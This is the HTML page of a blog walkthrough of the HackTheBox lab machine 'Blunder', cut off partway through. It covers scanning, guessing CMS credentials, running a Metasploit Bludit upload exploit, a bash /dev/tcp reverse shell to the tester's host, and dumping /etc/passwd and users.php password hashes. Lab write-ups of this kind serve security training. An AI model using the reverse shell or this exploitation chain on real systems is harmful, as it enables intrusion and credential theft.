@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+
+<html lang="en" class="dark">
+<head>
+
+<title>0xHippo&#39;s Blog | Blunder</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
+    <link rel="apple-touch-icon" sizes="180x180" href='/favicon/apple-touch-icon.png'>
+    <link rel="icon" type="image/png" href="/img/hippoSkullTransparent32x32.png">
+    
+    <link rel="manifest" href='/favicon/site.webmanifest' />
+    <link rel="mask-icon" href=' /favicon/safari-pinned-tab.svg' color="#5bbad5" />
+    <link rel="shortcut icon" href='/favicon/favicon.ico' />
+    <meta name="theme-color" content="#ffffff">
+    <meta property="og:title" content="0xHippo&#39;s Blog | Blunder" />
+    
+    
+    
+    <link rel="stylesheet" href="/css/style.min.ccd61bca2ee573b2849d6708276a4b7f3de6f5b3e65b22f39fe3330a326f683d.css" />
+    
+    <link href=' /css/blonde.min.css' rel="stylesheet" type="text/css" media="print"
+        onload="this.media=' all'">
+    
+
+
+
+<meta name="description" content="Blunder is a hilariously memorable box because of the simplicity behind exploiting CVE-2019-14287, a sudo version vulnerability, to gain root access. It starts out with a simple blog using the Bludit CMS. We find a version number that happens to be vulnerable to bypassing anti-brute force measures.
+ Recon Nmap We always start with our standard nmap scan. I typically immediately go to the script and version detection scan across all ports.">
+<meta property="og:site_name" content="0xHippo&#39;s Blog">
+<meta property="og:description" content="Blunder is a hilariously memorable box because of the simplicity behind exploiting CVE-2019-14287, a sudo version vulnerability, to gain root access. It starts out with a simple blog using the Bludit CMS. We find a version number that happens to be vulnerable to bypassing anti-brute force measures.
+ Recon Nmap We always start with our standard nmap scan. I typically immediately go to the script and version detection scan across all ports.">
+<meta property="og:url" content="https://0xHippo.github.io/posts/blunder/">
+<meta property="og:type" content="website">
+<meta property="og:locale" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="">
+
+<link rel="canonical" href="https://0xHippo.github.io/posts/blunder/">
+
+<meta name="twitter:description" content="Blunder is a hilariously memorable box because of the simplicity behind exploiting CVE-2019-14287, a sudo version vulnerability, to gain root access. It starts out with a simple blog using the Bludit CMS. We find a version number that happens to be vulnerable to bypassing anti-brute force measures.
+ Recon Nmap We always start with our standard nmap scan. I typically immediately go to the script and version detection scan across all ports.">
+<meta property="article:published_time" content="2020-08-25T22:43:30-04:00">
+<meta property="article:updated_time" content="2020-08-25T22:43:30-04:00">
+
+
+
+
+
+    
+<meta property="og:image" content="https://0xHippo.github.io/img/blunder/Blunder.png">
+<meta property="og:image:url" content="https://0xHippo.github.io/img/blunder/Blunder.png">
+    
+
+    
+    <link rel="stylesheet" href='/css/custom.css'>
+    <i class="dark hidden"></i>
+
+    <script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
+</head><body class="font-sans">
+    <div class="min-h-screen flex flex-col bg-gray-100 dark:bg-warmgray-800"><div class="bg-red-dark">
+    <div class="container max-w-screen-xl mr-auto ml-auto">
+        <nav class="flex items-center justify-between flex-wrap bg-red-dark p-6">
+            <div class="flex items-center flex-no-shrink bg-red-dark text-white mr-6">
+                <a href="https://0xHippo.github.io/"><span class="font-semibold text-2xl tracking-tight">0xHippo&#39;s Blog</span></a>
+            </div>
+            <div class="flex md:hidden">
+                <div class="py-2">
+                    <button onclick="toggleDarkMode()" class="focus:outline-none mr-1" aria-label="Darkmode Toggle Button"><i id="icon"
+                            class="icon-moon inline-flex align-middle leading-normal text-lg text-white"></i></button>
+                    <span class="text-white">|</span>
+                </div>
+                <button id="hamburgerbtn" class="flex items-center px-3 py-1 text-white hover:opacity-50" aria-label="Hamburger Button">
+                    <span class="icon-menu text-2xl"></span>
+                </button>
+            </div>
+            <div class="hidden w-full md:flex md:flex-row sm:items-center md:w-auto" id="mobileMenu">
+                <div class="text-sm lg:flex-grow">
+                </div>
+                <div class="navmenu">
+                    
+                    <a href="/"
+                        class="no-underline duration-200 block mt-4 sm:inline-block sm:mt-0 text-white hover:opacity-50 mr-4">
+                        Home
+                    </a>
+                    
+                    <a href="/about/"
+                        class="no-underline duration-200 block mt-4 sm:inline-block sm:mt-0 text-white hover:opacity-50 mr-4">
+                        About
+                    </a>
+                    
+                </div>
+                
+                <form class="widget-search__form" role="search" method="get" action="https://duckduckgo.com">
+                    <label>
+                        <input class="w-full p-3 focus:outline-none dark:bg-warmgray-900 dark:text-white placeholder-gray-700 dark:placeholder-gray-300" type="search"
+                            placeholder="Search..." value="" name="q" aria-label="Search">
+                    </label>
+                    <input class="hidden" type="submit" value="Search">
+                    <input type="hidden" name="sitesearch" value="https://0xHippo.github.io/" />
+                </form>
+                
+                <div class="text-white invisible md:visible">
+                    <button onclick="toggleDarkMode()" class="focus-visible:outline-none" aria-label="Darkmode Toggle Button"><i id="icon2"
+                            class="icon-moon hover:opacity-50 duration-200 inline-flex align-middle leading-normal text-lg ml-2"></i></button>
+                </div>
+            </div>
+        </nav>
+    </div>
+</div>
+<style>
+    .active {
+        display: block;
+    }
+</style>
+
+<script>
+    let hamburger = document.getElementById('hamburgerbtn');
+
+    let mobileMenu = document.getElementById('mobileMenu');
+
+    hamburger.addEventListener('click', function () {
+        mobileMenu.classList.toggle('active');
+    });
+</script>
+<div class="container max-w-screen-xl mx-auto mt-4 flex-grow px-5 lg:px-0" id="content">
+            <div class="lg:mx-5">
+<div class="grid grid-cols-3 gap-4">
+    
+    <div class="hidden lg:block lg:col-span-1">
+    
+    
+            
+            <style>
+    img {
+        float: left;
+    }
+</style>
+<div class="mb-3">
+    <img src="/img/hippoSkullTransparent1000x1000.png" alt="0xHippo" width="150" >
+    <ul class="text-xl text-left text-gray-700 py-3 px-3 dark:text-gray-300">
+        <li class="font-bold">0xHippo</li>
+        <li>
+            <a href="https://twitter.com/_0xHippo" rel="noopener noreferrer" target="_blank">
+                <i class="fab fa-fw fa-twitter-square" aria-hidden="false"></i>
+                <span class="label">Twitter</span>
+            </a>
+        </li>
+        <li>
+            <a href="https://github.com/0xHippo" rel="noopener noreferrer" target="_blank">
+                <i class="fab fa-fw fa-github-square" aria-hidden="false"></i>
+                <span class="label">Github</span>
+            </a>
+        </li>
+    </ul>
+    
+</div>
+        
+            
+            <div class="bg-white panel mb-3 pb-5 dark:bg-warmgray-900">
+    <p class="text-xl text-gray-700 py-3 px-3 dark:text-gray-300 font-bold">Archives</p>
+    
+    
+    
+</div>
+        
+            
+            
+        
+            
+            
+<div class="bg-white panel mb-3 dark:bg-warmgray-900">
+    <p class="text-xl text-center text-gray-700 py-3 pl-3 dark:text-gray-300 font-bold">Tags</p>
+    <div class="panel-block p-2">
+        <a href='/tags/hackthebox'>
+            <span
+                class="duration-100 inline-flex py-2 leading-4 mr-2 mb-2 content-center bg-gray-100 justify-center h-8 px-3 text-blue-500 hover:text-blue-900 dark:bg-warmgray-800">
+                hackthebox
+            </span></a>
+        <a href='/tags/linux'>
+            <span
+                class="duration-100 inline-flex py-2 leading-4 mr-2 mb-2 content-center bg-gray-100 justify-center h-8 px-3 text-blue-500 hover:text-blue-900 dark:bg-warmgray-800">
+                linux
+            </span></a>
+    </div>
+</div>
+
+
+        
+            
+            
+
+<div class="bg-white panel mb-3 pb-5 dark:bg-warmgray-900">
+    <p class="text-xl text-center text-gray-700 py-5 dark:text-gray-300 font-bold">Recent Posts</p>
+    <div class="mx-6">
+        <a href="/posts/blunder/" class="">
+            <div
+                class="w-full block mt-3 bg-white hover:bg-gray-100 duration-200 dark:bg-warmgray-900 dark:text-gray-200 dark:hover:bg-warmgray-800">
+                <div class="px-2">
+                    <div class="text-gray-900 font-bold text-xl dark:text-white">Blunder</div>
+                    <p class="text-sm text-gray-600 flex items-center pb-1 dark:text-gray-400">
+                        <time><span class="icon-access_time mr-1"></span>2020/08/25</time>
+                    </p>
+                </div>
+            </div>
+        </a>
+    </div>
+</div>
+
+        
+    
+</div>
+    <div class="bg-white col-span-3 lg:col-span-2 p-5 dark:bg-warmgray-900 dark:text-white">
+        
+            <h1 class="title text-4xl font-bold mb-2">Blunder</h1>
+            <div class="content prose md:prose-lg lg:prose-xl max-w-none dark:prose-invert py-1"><p>Blunder is a hilariously memorable box because of the simplicity behind exploiting CVE-2019-14287, a sudo version vulnerability, to gain root access.
+It starts out with a simple blog using the Bludit CMS. We find a version number that happens to be vulnerable to bypassing anti-brute force measures.</p>
+<figure><img src="/img/blunder/Blunder.png"
+         alt="Blunder"/>
+</figure>
+
+<h1 id="recon">Recon</h1>
+<h2 id="nmap">Nmap</h2>
+<p>We always start with our standard <code>nmap</code> scan. I typically immediately go to the script and version detection scan across all ports.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali:~/hackTheBox/boxes/blunder# cat nmap/scan.nmap 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.80 scan initiated Sat Jul 11 04:22:05 2020 as: nmap -sC -sV -p- -oA scan 10.10.10.191</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.191
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.035s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> filtered ports
+</span></span><span style="display:flex;"><span>PORT   STATE  SERVICE VERSION
+</span></span><span style="display:flex;"><span>21/tcp closed ftp
+</span></span><span style="display:flex;"><span>80/tcp open   http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-generator: Blunder
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Blunder | A blunder of interesting facts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Sat Jul 11 04:23:57 2020 -- 1 IP address (1 host up) scanned in 112.94 seconds</span></span></span></code></pre></div>
+<p>Seems interesting that ftp came up but with a closed state, we&rsquo;ll try to keep that in the back of our mind. The next logical thing is to check out the Apache site hosted on port 80.</p>
+<figure><img src="/img/blunder/site.PNG"
+         alt="Blog"/>
+</figure>
+
+<p>We can see a standard blog with nothing too special. Just in case there are any CTF-esque bits within the text I&rsquo;ll give it a quick read over and check what links I can click. While quickly skimming through the blog, I notice a suspicious looking pair of words mushed together.</p>
+<figure><img src="/img/blunder/suspicousWord.PNG"
+         alt="Sus"/>
+</figure>
+
+<p>Of course it could have just been a typo in forgetting the space but I&rsquo;ll keep this in the back of my mind. Meanwhile I was brute forcing the site directories with <code>gobuster</code> in the background.</p>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="gobuster">Gobuster</h2>
+<p>I take the same kitchen-sink approach from nmap and run through <code>gobuster</code> with multiple common file extensions and dirbuster&rsquo;s medium sized directory list. After finding LICENSE it began to error out a ton, so I cut out everything following that point.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali:~/hackTheBox/boxes/blunder# gobuster dir -x html,js,txt,php -u http://10.10.10.191 -t <span style="color:#ae81ff">50</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.1.0
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.10.191
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">50</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              txt,php,html,js
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>2020/06/11 18:34:11 Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/about                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3281<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/0                    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 7562<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/admin                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.191/admin/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/install.php          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 30<span style="color:#f92672">]</span>                                
+</span></span><span style="display:flex;"><span>/robots.txt           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 22<span style="color:#f92672">]</span>                                
+</span></span><span style="display:flex;"><span>/todo.txt             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 118<span style="color:#f92672">]</span>                               
+</span></span><span style="display:flex;"><span>/usb                  <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3960<span style="color:#f92672">]</span>                              
+</span></span><span style="display:flex;"><span>/LICENSE              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1ssssssssssssssssssssssssssssssssssssssd083<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>------<span style="color:#f92672">[</span>Errors cut out<span style="color:#f92672">]</span>-------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>2020/06/11 19:20:48 Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span></span></span></code></pre></div>
+<h3 id="admin">/admin/</h3>
+<p>Anything with <code>admin</code> in the name always looks promising. After traversing here we find an admin login page for this site&rsquo;s CMS, Bludit.</p>
+<figure><img src="/img/blunder/admin.PNG"
+         alt="Admin login"/>
+</figure>
+
+<p>Very promising news. Now we can move on to checking out <code>todo.txt</code>.</p>
+<h3 id="todotxt">/todo.txt</h3>
+<p>Here we see some juicy info.</p>
+<pre tabindex="0"><code>-Update the CMS
+-Turn off FTP - DONE
+-Remove old users - DONE
+-Inform fergus that the new blog needs images - PENDING
+</code></pre><p><code>Turn off FTP</code> now makes sense as to why port 21 had a closed status. We see the action with <code>fergus</code> is still pending, that tells us that they are still an active user.</p>
+<h2 id="admin-login-attempt">Admin login attempt</h2>
+<p>Combining all the info so far, we might know the admin login. We try <code>fergus</code> as the username and that suspicious looking word <code>RolandDeschain</code> as our password, and voilà! We&rsquo;re in the admin dashboard.</p>
+<figure><img src="/img/blunder/dashboard.PNG"
+         alt="Admin dashboard"/>
+</figure>
+
+<p>Since this was a very CTF like way to solve this, we can go down the route of how we would have achieved this access methodically.</p>
+<h3 id="doing-it-the-proper-way">Doing it the &ldquo;proper&rdquo; way</h3>
+<p>Simply searching <code>bludit exploit</code> yields two very interesting top results from exploit-db.</p>
+<h5 id="bludit-auth-bruteforce-bypass-httpswwwexploit-dbcomexploits48942">Bludit Auth Bruteforce Bypass: <a href="https://www.exploit-db.com/exploits/48942">https://www.exploit-db.com/exploits/48942</a></h5>
+<h5 id="bludit-directory-traversal-httpswwwexploit-dbcomexploits48701">Bludit Directory Traversal: <a href="https://www.exploit-db.com/exploits/48701">https://www.exploit-db.com/exploits/48701</a></h5>
+<p>Both of these can be used for version 3.9.2. So now we can investigate the version of Bludit being used. I&rsquo;ll start with checking the html page source of the admin login page. We can see that this login page must still be using the base CSS stylesheet that comes along with Bludit. Within here we can see it is, in fact, on version 3.9.2.</p>
+<figure><img src="/img/blunder/bluditVersion.png"
+         alt="Bludit version"/>
+</figure>
+
+<p>So I suspect we would have then used the bruteforce bypass exploit to pass a wordlist with the user <code>fergus</code> to gain access. Given the nature of the password that we know now, I probabaly would have hit a wall since <code>RolandDeschain</code> may not be within the rockyou.txt list. So instead we could have created a custom word list from crawling the blog with something like <code>cewl</code>. This would have provided us with the necessary password to access the admin dashboard.</p>
+<h1 id="foothold">Foothold</h1>
+<h2 id="bludit-directory-traversal-exploitation">Bludit Directory Traversal exploitation</h2>
+<p>Now that we have full credentials we can load up metasploit to use the aforementioned Directory Traversal exploit.</p>
+<p>We search for the metasploit module and use the exploit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; search bludit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                                          Disclosure Date  Rank       Check  Description</span>
+</span></span><span style="display:flex;"><span>   -  ----                                          ---------------  ----       -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Interact with a module by name or index. For example info 0, use <span style="color:#ae81ff">0</span> or use exploit/linux/http/bludit_upload_images_exec
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 &gt; use exploit/linux/http/bludit_upload_images_exec 
+</span></span></code></pre></div><p>We supply the necessary options and run the exploit.</p>
+<figure><img src="/img/blunder/foothold.PNG"
+         alt="www-data foothold"/>
+</figure>
+
+<p>Now we have accomplished our foothold as www-data!</p>
+<h1 id="privesc-www-data">PrivEsc: www-data</h1>
+<h2 id="enumeration-1">Enumeration</h2>
+<p>We are going to begin with creating a proper bash reverse shell from the meterpreter shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;exec bash -i &amp;&gt;/dev/tcp/10.10.14.13/6666 &lt;&amp;1&#39;</span>
+</span></span></code></pre></div><figure><img src="/img/blunder/revShell.PNG"
+         alt="Reverse shell"/>
+</figure>
+
+<p>Now we can properly enumerate. Let&rsquo;s start with checking <code>/etc/passwd</code> for any usernames we can hunt for.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ cat /etc/passwd | grep home
+</span></span><span style="display:flex;"><span>&lt;2/bl-content/databases$ cat /etc/passwd | grep home         
+</span></span><span style="display:flex;"><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>cups-pk-helper:x:112:119:user <span style="color:#66d9ef">for</span> cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+</span></span><span style="display:flex; background-color:#3c3d38"><span>shaun:x:1000:1000:blunder,,,:/home/shaun:/bin/bash
+</span></span><span style="display:flex; background-color:#3c3d38"><span>hugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash
+</span></span><span style="display:flex;"><span>temp:x:1002:1002:,,,:/home/temp:/bin/bash</span></span></code></pre></div>
+<p>Now we have our two targets, hugo and shaun. We start with checking the databases directory in the home www-data folder we started within. We check the users.php file and find a couple users and hashed password.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ cat users.php
+</span></span><span style="display:flex;"><span>cat users.php
+</span></span><span style="display:flex;"><span>&lt;?php defined<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;BLUDIT&#39;</span><span style="color:#f92672">)</span> or die<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Bludit CMS.&#39;</span><span style="color:#f92672">)</span>; ?&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    <span style="color:#e6db74">&#34;admin&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;nickname&#34;</span>: <span style="color:#e6db74">&#34;Admin&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;firstName&#34;</span>: <span style="color:#e6db74">&#34;Administrator&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;lastName&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>,
+</span></span><span style="display:flex; background-color:#3c3d38"><span>        <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;bfcc887f62e36ea019e3295aafb8a3885966e265&#34;</span>,
+</span></span><span style="display:flex; background-color:#3c3d38"><span>        <span style="color:#e6db74">&#34;salt&#34;</span>: <span style="color:#e6db74">&#34;5dde2887e7aca&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;registered&#34;</span>: <span style="color:#e6db74">&#34;2019-11-27 07:40:55&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;tokenRemember&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;tokenAuth&#34;</span>: <span style="color:#e6db74">&#34;b380cb62057e9da47afce66b4615107d&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;tokenAuthTTL&#34;</span>: <span style="color:#e6db74">&#34;2009-03-15 14:00&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;twitter&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;facebook&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;instagram&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;codepen&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;linkedin&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;github&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;gitlab&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    <span style="color:#e6db74">&#34;fergus&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;firstName&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;lastName&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;nickname&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;author&#34;</span>,
+</span></span><span style="display:flex; background-color:#3c3d38"><span>        <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7&#34;</span>,
+</span></span><span style="display:flex; background-color:#3c3d38"><span>        <span style="color:#e6db74">&#34;salt&#34;</span>: <span style="color:#e6db74">&#34;jqxpjfnv&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;registered&#34;</span>: <span style="color:#e6db74">&#34;2019-11-27 13:26:44&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;tokenRemember&#34;</span>: <span style="color:#e6db74">&#34;9708bd72b024b7162263e01847f58144&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;tokenAuth&#34;</span>: <span style="color:#e6db74">&#34;0e8011811356c0c5bd2211cba8c50471&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;tokenAuthTTL&#34;</span>: <span style="color:#e6db74">&#34;2009-03-15 14:00&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;twitter&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;facebook&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;codepen&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;instagram&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;github&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;gitlab&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;linkedin&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;mastodon&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div>
+<p>Not exactly what we&rsquo;re looking for so we continue on. A few levels above this directory we can see a new version of bludit within <code>/var/www/</code> named <code>bludit-3.10.0a</code>. Seems that they were in the process of upgrading their Bludit version, within this directory we find another <code>users.php</code> file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
+</span></span><span style="display:flex;"><span>cat users.php
+</span></span><span style="display:flex;"><span>&lt;?php defined<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;BLUDIT&#39;</span><span style="color:#f92672">)</span> or die<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Bludit CMS.&#39;</span><span style="color:#f92672">)</span>; ?&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    <span style="color:#e6db74">&#34;admin&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;nickname&#34;</span>: <span style="color:#e6db74">&#34;Hugo&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;firstName&#34;</span>: <span style="color:#e6db74">&#34;Hugo&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;lastName&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
